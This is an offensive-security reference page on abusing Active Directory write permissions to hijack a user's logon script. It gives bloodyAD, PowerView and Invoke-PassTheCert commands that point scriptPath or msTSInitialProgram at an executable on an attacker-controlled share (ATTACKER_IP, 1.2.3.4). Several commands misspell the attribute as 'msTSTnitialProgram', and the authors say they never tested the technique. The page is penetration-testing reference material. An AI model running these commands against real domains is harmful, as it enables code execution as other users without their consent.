---
authors: CravateRouge, ShutdownRepo, jamarir
category: ad
---

# Logon script

> [!NOTE]
> It is worth noting that during lab testing, I couldn't find a way to practice this scenario. Since I didn't find practical enough resources on the Internet, feel free to reach out if you manage to exploit this.

This abuse can be carried out when controlling an object that has a `GenericAll` or `GenericWrite` over the target, or a `WriteProperty` premission over the target's logon script attribute (i.e. `scriptPath` or `msTSInitialProgram`).

The attacker can make the user execute a custom script at logon.

::: tabs


=== UNIX-like

This can be achieved with [bloodyAD](https://github.com/CravateRouge/bloodyAD).
```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user msTSInitialProgram -v '\\1.2.3.4\share\file.exe'
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user msTSWorkDirectory -v 'C:\'

# or
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object vulnerable_user scriptPath -v '\\1.2.3.4\share\file.exe'
```


=== Windows

This can be achieved with [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).

```bash

Set-DomainObject testuser -Set @{'msTSTnitialProgram'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose

Set-DomainObject testuser -Set @{'scriptPath'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose
```

The [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork can also be used, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert) (PowerShell).

> Note: the [README](https://github.com/jamarir/Invoke-PassTheCert/blob/main/README.md) contains the methodology to request a certificate using [certreq](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862) from Windows (with a password, or an NTHash).
```powershell
# Import the PowerShell script and show its manual
Import-Module .\Invoke-PassTheCert.ps1
.\Invoke-PassTheCert.ps1 -?
# Authenticate to LDAP/S
$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
# List all the available actions
Invoke-PassTheCert -a -NoBanner

# Overwrite the 'msTSTnitialProgram' and 'scriptPath' attributes's values of 'John JD. DOE' user to '\\ATTACKER_IP\share\run_at_logon.exe'
Invoke-PassTheCert -Action 'OverwriteValueInAttribute' -LdapConnection $LdapConnection -Object 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'msTSTnitialProgram' -Value '\\ATTACKER_IP\share\run_at_logon.exe'
Invoke-PassTheCert -Action 'OverwriteValueInAttribute' -LdapConnection $LdapConnection -Object 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'scriptPath' -Value '\\ATTACKER_IP\share\run_at_logon.exe'
```

:::